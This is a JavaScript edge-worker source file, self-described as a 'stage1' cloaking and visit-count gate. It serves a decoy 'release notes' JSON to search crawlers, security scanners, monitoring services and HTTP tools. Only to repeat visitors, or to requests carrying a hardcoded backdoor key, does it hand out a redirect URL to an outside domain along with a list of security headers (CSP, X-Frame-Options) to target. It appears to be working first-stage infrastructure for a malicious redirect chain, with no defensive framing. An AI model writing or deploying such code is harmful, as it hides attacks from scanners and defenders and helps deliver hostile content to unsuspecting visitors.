/**
 * stage1 — Zeabur cloaking / visit-count gate
 */

const REAL_HEADERS = [
  'content-security-policy',
  'x-frame-options',
  'content-security-policy-report-only',
];

const REAL_U = 'https://zhfa.zhwkr.co.uk/';

const COOL_DOWN_TIME = 300;
const VISIT_THRESHOLD = 10;
const COOKIE_BASE = 'Path=/; Max-Age=31536000; Secure; SameSite=Lax';
const BACKDOOR_K = 'zhimakaimen';

const BOT_KEYWORDS = [
  'Googlebot', 'bingbot', 'Baiduspider', 'YandexBot', 'DuckDuckBot', 'Sogou', 'Exabot',
  'facebookexternalhit', 'ia_archiver', 'Slackbot', 'Twitterbot', 'LinkedInBot', 'WhatsApp',
  'TelegramBot', 'Discordbot', 'curl', 'wget', 'python-requests', 'python-urllib', 'node-fetch',
  'axios', 'Go-http-client', 'Java/', 'okhttp', 'libwww-perl', 'Scrapy', 'HeadlessChrome',
  'PhantomJS', 'Puppeteer', 'Uptimerobot', 'Pingdom', 'DatadogSynthetics', 'Netcraft',
];

export function buildRealPayload() {
  return { ...buildDecoyPayload(), h: REAL_HEADERS.slice(), u: REAL_U };
}

export function buildDecoyPayload() {
  return {
    ok: true,
    schema: 1,
    release: {
      channel: 'stable',
      notes: 'Stability and performance improvements.',
      updated_at: Math.floor(Date.now() / 1000),
    },
    flags: { telemetry: false, experimental: false },
    ttl: 86400,
  };
}

function isBot(userAgent) {
  const ua = (userAgent || '').toLowerCase();
  return BOT_KEYWORDS.some((keyword) => ua.includes(keyword.toLowerCase()));
}

function parseCookieInt(cookieHeader, name) {
  const match = cookieHeader.match(new RegExp(`${name}=(\\d+)`));
  return match ? parseInt(match[1], 10) : null;
}

function resolveVisitCount(cookieHeader, kParam) {
  let visitCount = 1;
  const existing = parseCookieInt(cookieHeader, 'v');
  if (existing !== null) visitCount = existing;
  const lastVisitTimestamp = parseCookieInt(cookieHeader, 'ts') ?? 0;
  const currentTimeSec = Math.floor(Date.now() / 1000);
  let shouldIncreaseCount = true;
  if (kParam === BACKDOOR_K) {
    visitCount = 100;
    shouldIncreaseCount = false;
  } else if (lastVisitTimestamp > 0 && currentTimeSec - lastVisitTimestamp < COOL_DOWN_TIME) {
    shouldIncreaseCount = false;
  }
  if (shouldIncreaseCount) visitCount += 1;
  return { visitCount, currentTimeSec };
}

function jsonResponse(body, cookies) {
  const headers = new Headers({
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET',
  });
  for (const cookie of cookies) headers.append('Set-Cookie', cookie);
  return new Response(JSON.stringify(body), { status: 200, headers });
}

export default {
  async fetch(request) {
    const url = new URL(request.url);
    if (url.pathname === '/favicon.ico') return new Response(null, { status: 204 });
    const userAgent = request.headers.get('user-agent') || '';
    const cookieHeader = request.headers.get('cookie') || '';
    const kParam = url.searchParams.get('k');
    const { visitCount, currentTimeSec } = resolveVisitCount(cookieHeader, kParam);
    const cookies = [`v=${visitCount}; ${COOKIE_BASE}`, `ts=${currentTimeSec}; ${COOKIE_BASE}`];
    if (isBot(userAgent)) return jsonResponse(buildDecoyPayload(), cookies);
    if (visitCount > VISIT_THRESHOLD) return jsonResponse(buildRealPayload(), cookies);
    return jsonResponse(buildDecoyPayload(), cookies);
  },
};
